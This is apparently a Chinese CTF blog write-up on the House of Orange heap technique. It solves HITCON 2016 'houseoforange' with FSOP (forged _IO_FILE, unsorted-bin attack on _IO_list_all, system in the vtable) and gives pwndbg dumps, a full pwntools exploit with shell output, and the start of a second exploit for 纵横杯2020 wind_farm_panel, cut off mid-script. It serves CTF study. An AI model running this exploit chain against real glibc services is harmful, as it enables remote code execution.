<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x29c bytes:</span><br><span class="line">    00000000  4e 61 6d 65  20 6f 66 20  68 6f 75 73  65 20 3a 20  │Name│ of │hous│e : │</span><br><span class="line">    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│</span><br><span class="line">    00000020  61 61 61 61  61 61 61 61  c0 10 f0 55  55 55 0a 50  │aaaa│aaaa│···U│UU·P│</span><br><span class="line">[+] heap_base:0x555555f01000</span><br></pre></td></tr></table></figure>

<h4 id="5-fsop"><a href="#5-fsop" class="headerlink" title="5.fsop"></a>5.fsop</h4><blockquote>
<p>通过溢出，修改原来top chunk的内容。</p>
<ol>
<li><p>修改size为0x60，从而unsortbin取走后放入smallbin0x60大小中</p>
</li>
<li><p>伪造io file，最开始放上’/bin/sh\x00’，<code>IO_write_ptr=1&gt;IO_write_base=0</code>，伪造vtache，在_IO_overflow放上system地址</p>
</li>
<li><p>unsortbin attack，修改_IO_list_all为&amp;main_arena，在unsortedbin取链时，会在bk+0x10的位置写上&amp;main_arena</p>
</li>
<li><p>再次malloc的时候，由于unsortedbin异常，故会打印错误，调用如下链：</p>
<p><code>**libc_malloc =&gt; malloc_printerr =&gt;** libc_message =&gt; abort =&gt; _IO_flush_all_lockp</code></p>
<p>由于main_arena那个是错误的io file，会顺着_chain找下一个，也就是我们伪造的io file，从而调用system，get shell</p>
</li>
</ol>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb0c0</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555556ffb4d0</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin)</span><br><span class="line">Addr: 0x555556ffb4f0</span><br><span class="line">Size: 0x60</span><br><span class="line">fd: 0x00</span><br><span class="line">bk: 0x7fee3bd3b510</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x555556ffb4f0</span><br><span class="line">0x555556ffb4f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556ffb500:	0x0000000000000000	0x00007fee3bd3b510</span><br><span class="line">0x555556ffb510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556ffb520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb5c0:	0x0000000000000000	0x0000555556ffb5c8</span><br><span class="line">0x555556ffb5d0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5e0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb5f0:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb600:	0x00007fee3b9de570	0x00007fee3b9de570</span><br><span class="line">0x555556ffb610:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556ffb620:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  __dummy &#x3D; 93825020179912, </span><br><span class="line">  __dummy2 &#x3D; 140661179147632, </span><br><span class="line">  __finish &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __overflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __underflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __uflow &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __pbackfail &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsputn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __xsgetn &#x3D; 0x7fee3b9de570 &lt;__libc_system&gt;, </span><br><span class="line">  __seekoff &#x3D; 0x0, </span><br><span class="line">  __seekpos &#x3D; 0x0, </span><br><span class="line">  __setbuf &#x3D; 0x0, </span><br><span class="line">  __sync &#x3D; 0x0, </span><br><span class="line">  __doallocate &#x3D; 0x0, </span><br><span class="line">  __read &#x3D; 0x0, </span><br><span class="line">  __write &#x3D; 0x0, </span><br><span class="line">  __seek &#x3D; 0x0, </span><br><span class="line">  __close &#x3D; 0x0, </span><br><span class="line">  __stat &#x3D; 0x0, </span><br><span class="line">  __showmanyc &#x3D; 0x0, </span><br><span class="line">  __imbue &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p*((struct _IO_FILE_plus*)0x555556ffb4f0)-&gt;vtable.__overflow</span><br><span class="line">$1 &#x3D; &#123;int (_IO_FILE *, int)&#125; 0x7fee3b9de570 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fee3bd3b510</span><br><span class="line">0x7fee3bd3b510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7fee3bd3b520 &lt;__GI__IO_list_all&gt;:	0x00007fee3bd3b540	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="6-malloc报错"><a href="#6-malloc报错" class="headerlink" title="6.malloc报错"></a>6.malloc报错</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b7510</span><br><span class="line">0x7faf3a0b7510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faf3a0b7520 &lt;__GI__IO_list_all&gt;:	0x00007faf3a0b6b78	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  p _IO_list_all</span><br><span class="line">$1 &#x3D; (struct _IO_FILE_plus *) 0x7faf3a0b6b78 &lt;main_arena+88&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007faf3a0b6b78 + 0x60</span><br><span class="line">0x7faf3a0b6bd8 &lt;main_arena+184&gt;:	0x0000555556b754f0	0x0000555556b754f0</span><br><span class="line">0x7faf3a0b6be8 &lt;main_arena+200&gt;:	0x00007faf3a0b6bd8	0x00007faf3a0b6bd8</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000555556b754f0</span><br><span class="line">0x555556b754f0:	0x0068732f6e69622f	0x0000000000000060</span><br><span class="line">0x555556b75500:	0x00007faf3a0b6bc8	0x00007faf3a0b6bc8</span><br><span class="line">0x555556b75510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555556b75520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75550:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75570:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75580:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b75590:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555556b755c0:	0x0000000000000000	0x0000555556b755c8</span><br><span class="line">0x555556b755d0:	0x00007faf39d5a570	0x00007faf39d5a570</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">'debug'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">file =<span class="string">'houseoforange_hitcon_2016'</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">      env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process(<span class="string">"./houseoforange_hitcon_2016"</span>,</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/buu/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">  p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">  p.sendline(str(choice))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">1</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Price of Orange"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Color of Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,name,price=<span class="number">1</span>,color=<span class="number">0xddaa</span>)</span>:</span></span><br><span class="line">  cmd(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">  p.sendline(str(size))</span><br><span class="line">  p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">  p.send(name)</span><br><span class="line">  p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">  p.sendline(str(price))</span><br><span class="line">  p.recvuntil(<span class="string">"Orange"</span>)</span><br><span class="line">  p.sendline(str(color))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'a'</span>)</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(<span class="number">0x1f</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  log.success(<span class="string">"0:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  log.success(<span class="string">"1:"</span>+hex(local))</span><br><span class="line">  libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  log.success(<span class="string">"2:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x3bba61</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1/2概率</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007fdf7644b520 ***</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007f37d5976520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x6e bytes:</span><br><span class="line">    &#39;core\tgets\thouseoforange_hitcon_2016  magic.py   orange.py\n&#39;</span><br><span class="line">    &#39;exp.py\thoo.py\tlibc-2.23.so\t\t   magicheap  winter.py\n&#39;</span><br><span class="line">core    gets    houseoforange_hitcon_2016  magic.py   orange.py</span><br><span class="line">exp.py    hoo.py    libc-2.23.so           magicheap  winter.py</span><br></pre></td></tr></table></figure>

<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p><a href="houseoforange_hitcon_2016">附件</a></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/218887#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/218887#h3-4</a></li>
<li><a href="https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80</a></li>
<li><a href="http://blog.eonew.cn/archives/1093#glibc-227" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1093#glibc-227</a></li>
<li><a href="https://www.xi4oyu.top/6a6ded9c/" target="_blank" rel="noopener">https://www.xi4oyu.top/6a6ded9c/</a></li>
<li><a href="https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/" target="_blank" rel="noopener">https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/</a></li>
<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></li>
<li><a href="https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/" target="_blank" rel="noopener">https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/</a></li>
</ul>
<h2 id="纵横杯2020-wind-farm-panel"><a href="#纵横杯2020-wind-farm-panel" class="headerlink" title="纵横杯2020 - wind_farm_panel"></a>纵横杯2020 - wind_farm_panel</h2><blockquote>
<p>house of orange的经典题，没啥变化，，，有了上一个基础，很快能做出来</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/13/house-of-orange/image-20201229182916014.png" alt="image-20201229182916014"></p>
<p>根据菜单，只有添加、打印和修改功能，没有free功能</p>
<p><img src="/2021/05/13/house-of-orange/image-20201229183505395.png" alt="image-20201229183505395"></p>
<p><img src="/2021/05/13/house-of-orange/image-20201229183037804.png" alt="image-20201229183037804"></p>
<p>而且添加和修改的时候都有堆溢出，故应该用house of orange来解。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"wind_farm_panel"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span 